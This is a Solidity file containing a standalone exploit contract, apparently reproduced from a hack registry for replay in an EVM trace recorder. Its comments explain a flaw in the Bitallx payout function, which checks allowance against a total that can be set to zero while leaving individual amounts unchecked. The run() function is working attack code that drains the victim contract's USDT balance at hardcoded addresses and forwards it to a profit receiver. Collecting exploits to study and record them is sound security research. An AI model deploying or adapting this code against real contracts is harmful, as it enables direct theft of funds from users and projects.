// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground — a faithful copy of
// BitallxPayOutAttack from evm-hack-registry/2025-05-bitallx_exp/test/bitallx_exp.sol,
// with one change needed only to make it replayable by the recorder:
//
// The original attack runs entirely inside the exploit contract's constructor
// (`new BitallxPayOutAttack(profitReceiver)`), but the recorder deploys the
// exploit contract UNRECORDED and then calls a separate `attackFunction` on
// the deployed instance to capture the opcode trace — so constructor-only
// logic would never be recorded. Here the constructor only stores
// `profitReceiver`, and the attack body moves into `run()`, called as the
// recorded attackFunction. All addresses, call sequence, and logic are
// otherwise copied verbatim from the original test file.
//
// Root cause (see test/bitallx_exp.sol header): BitallxSC.BitallxPayOut(
// tokencontract, wallet[], amount[], totalSendAmount) validates the caller's
// allowance/balance against `totalSendAmount` but never checks that
// sum(amount[]) is bounded by `totalSendAmount`. Calling it with
// totalSendAmount = 0 makes the allowance/balance check trivially pass (a
// 0-value transferFrom), while `amount[0]` can still be set to the victim
// contract's own USDT balance — so the payout loop transfers the victim's
// existing USDT straight to the caller with no real authorization.

address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant BITALLX_SC = 0xa5f3728767F834C591eE99C8C5854b752F39C385;

interface IBitallxSC {
    function BitallxPayOut(
        address tokencontract,
        address[] calldata wallet,
        uint256[] calldata amount,
        uint256 totalSendAmount
    ) external;
}

interface IBitallxToken {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract BitallxPayOutExploit {
    address private immutable profitReceiver;

    constructor(address profitReceiver_) {
        profitReceiver = profitReceiver_;
    }

    function run() external {
        IBitallxToken usdt = IBitallxToken(USDT_TOKEN);
        uint256 victimBalance = usdt.balanceOf(BITALLX_SC);

        address[] memory wallets = new address[](1);
        wallets[0] = address(this);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = victimBalance;

        IBitallxSC(BITALLX_SC).BitallxPayOut(USDT_TOKEN, wallets, amounts, 0);

        require(usdt.transfer(profitReceiver, usdt.balanceOf(address(this))), "profit transfer failed");
    }
}
